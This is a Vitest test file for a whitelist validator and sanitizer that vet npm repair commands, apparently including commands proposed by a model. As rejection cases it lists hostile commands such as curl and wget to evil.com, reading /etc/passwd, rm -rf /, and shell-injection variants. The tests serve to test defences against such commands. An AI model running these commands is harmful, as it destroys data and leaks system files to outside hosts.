import { describe, expect, it } from "vitest";
import {
  validateCommand,
  classifyInstallFailure,
  sanitizePlan,
  type RepairPlan,
} from "../../supabase/functions/_shared/repairPlanContract";

describe("Runner Repair Whitelist Validator", () => {
  it("permits safe whitelisted commands", () => {
    expect(validateCommand("npm install --legacy-peer-deps --no-audit --no-fund").ok).toBe(true);
    expect(validateCommand("npm install --package-lock-only --no-audit --no-fund").ok).toBe(true);
    expect(validateCommand("npm ci --no-audit --no-fund").ok).toBe(true);
    expect(validateCommand("npm dedupe --legacy-peer-deps").ok).toBe(true);
    expect(validateCommand("npm ls --depth=0").ok).toBe(true);
    expect(validateCommand("rm -rf node_modules").ok).toBe(true);
    expect(validateCommand("rm -f package-lock.json").ok).toBe(true);
    expect(validateCommand("node scripts/verify.cjs").ok).toBe(true);
  });

  it("strictly rejects non-whitelisted binaries", () => {
    expect(validateCommand("bash -c 'rm -rf *'").ok).toBe(false);
    expect(validateCommand("sh -c whoami").ok).toBe(false);
    expect(validateCommand("curl https://evil.com/leak").ok).toBe(false);
    expect(validateCommand("wget https://evil.com/leak").ok).toBe(false);
    expect(validateCommand("cat /etc/passwd").ok).toBe(false);
    expect(validateCommand("echo 'hack'").ok).toBe(false);
  });

  it("strictly rejects shell metacharacters and injection", () => {
    expect(validateCommand("npm install; rm -rf /").ok).toBe(false);
    expect(validateCommand("npm install && curl evil.com").ok).toBe(false);
    expect(validateCommand("npm install || true").ok).toBe(false);
    expect(validateCommand("npm install | tee log").ok).toBe(false);
    expect(validateCommand("npm install $(whoami)").ok).toBe(false);
    expect(validateCommand("npm install `whoami`").ok).toBe(false);
    expect(validateCommand("npm install > leak.txt").ok).toBe(false);
    expect(validateCommand("npm install < input.txt").ok).toBe(false);
    expect(validateCommand("npm install \n rm -rf node_modules").ok).toBe(false);
  });

  it("strictly rejects destructive rm outside permitted dependency artifacts", () => {
    expect(validateCommand("rm -rf src").ok).toBe(false);
    expect(validateCommand("rm -rf android").ok).toBe(false);
    expect(validateCommand("rm -rf package.json").ok).toBe(false);
    expect(validateCommand("rm -rf .git").ok).toBe(false);
    expect(validateCommand("rm -rf /").ok).toBe(false);
    expect(validateCommand("rm -rf *").ok).toBe(false);
  });

  it("strictly rejects path traversal and protected path escapes", () => {
    expect(validateCommand("node ../evil.js").ok).toBe(false);
    expect(validateCommand("node /tmp/leak.js").ok).toBe(false);
    expect(validateCommand("rm -rf .github/workflows/build.yml").ok).toBe(false);
    expect(validateCommand("rm -rf .env").ok).toBe(false);
    expect(validateCommand("rm -f app.keystore").ok).toBe(false);
    expect(validateCommand("rm -f secret.pem").ok).toBe(false);
  });

  it("rejects npm account commands", () => {
    expect(validateCommand("npm publish").ok).toBe(false);
    expect(validateCommand("npm login").ok).toBe(false);
    expect(validateCommand("npm token").ok).toBe(false);
    expect(validateCommand("npm adduser").ok).toBe(false);
  });
});

describe("Deterministic Classifier", () => {
  it("classifies LOCKFILE_MISMATCH from npm ci error", () => {
    const log = `
npm ERR! code EUSAGE
npm ERR!
npm ERR! \`npm ci\` can only install packages when your package.json and package-lock.json or npm-shrinkwrap.json are in sync. Please update your lock file with \`npm install\` before continuing.
npm ERR!
npm ERR! Missing: @capacitor/core@^6.0.0 from lock file
`;
    const plan = classifyInstallFailure({ installLog: log, lockfileName: "package-lock.json" });
    expect(plan.diagnosis.type).toBe("LOCKFILE_MISMATCH");
    expect(plan.diagnosis.severity).toBe("high");
    expect(plan.commands).toHaveLength(3);
    expect(plan.commands[0].cmd).toBe("rm -f package-lock.json");
    expect(plan.commands[1].cmd).toContain("package-lock-only");
    expect(plan.commands[2].cmd).toContain("npm ci");
  });

  it("classifies DEPENDENCY_CONFLICT from ERESOLVE", () => {
    const log = `
npm ERR! code ERESOLVE
npm ERR! ERESOLVE could not resolve
npm ERR! While resolving: react-router-dom@6.20.0
npm ERR! Found: react@18.3.1
npm ERR! Conflicting peer dependency: react@^17.0.0
`;
    const plan = classifyInstallFailure({ installLog: log });
    expect(plan.diagnosis.type).toBe("DEPENDENCY_CONFLICT");
    expect(plan.diagnosis.severity).toBe("medium");
    expect(plan.commands[0].cmd).toContain("--legacy-peer-deps");
  });

  it("classifies SCRIPT_FAILURE from lifecycle errors", () => {
    const log = `
npm ERR! code ELIFECYCLE
npm ERR! errno 1
npm ERR! postinstall: \`node build.js\`
npm ERR! Exit status 1
npm ERR! Failed at the postinstall script.
`;
    const plan = classifyInstallFailure({ installLog: log });
    expect(plan.diagnosis.type).toBe("SCRIPT_FAILURE");
    expect(plan.commands[0].cmd).toContain("--ignore-scripts");
  });

  it("classifies REGISTRY_404 when packages are missing from registry", () => {
    const log = `
npm ERR! code E404
npm ERR! 404 Not Found - GET https://registry.npmjs.org/@private/sdk - Not found
`;
    const plan = classifyInstallFailure({ installLog: log });
    expect(plan.diagnosis.type).toBe("REGISTRY_404");
  });

  it("returns UNKNOWN for unrecognizable logs to trigger model escalation", () => {
    const log = "Something completely unrelated broke on line 42";
    const plan = classifyInstallFailure({ installLog: log });
    expect(plan.diagnosis.type).toBe("UNKNOWN");
    expect(plan.commands).toHaveLength(0);
  });
});

describe("sanitizePlan", () => {
  it("filters out invalid commands from a model or proposed plan", () => {
    const badPlan: RepairPlan = {
      diagnosis: {
        type: "UNKNOWN",
        severity: "high",
        rootCause: "test",
        evidence: [],
      },
      commands: [
        { step: 1, name: "Legit install", cmd: "npm install --legacy-peer-deps", critical: true, why: "safe" },
        { step: 2, name: "Dangerous rm", cmd: "rm -rf /", critical: false, why: "bad" },
        { step: 3, name: "Shell injection", cmd: "npm install && cat /etc/passwd", critical: false, why: "bad" },
      ],
      verify: ["npm ls --depth=0", "curl evil.com"],
      rollback: ["rm -rf node_modules"],
      source: "model",
      attempt: 1,
    };

    const { plan, rejected } = sanitizePlan(badPlan);
    expect(plan.commands).toHaveLength(1);
    expect(plan.commands[0].cmd).toBe("npm install --legacy-peer-deps");
    expect(plan.verify).toEqual(["npm ls --depth=0"]);
    expect(plan.rollback).toEqual(["rm -rf node_modules"]);
    expect(rejected).toHaveLength(2);
    expect(rejected.some((r) => r.cmd.includes("rm -rf /"))).toBe(true);
    expect(rejected.some((r) => r.cmd.includes("cat /etc/passwd"))).toBe(true);
  });
});
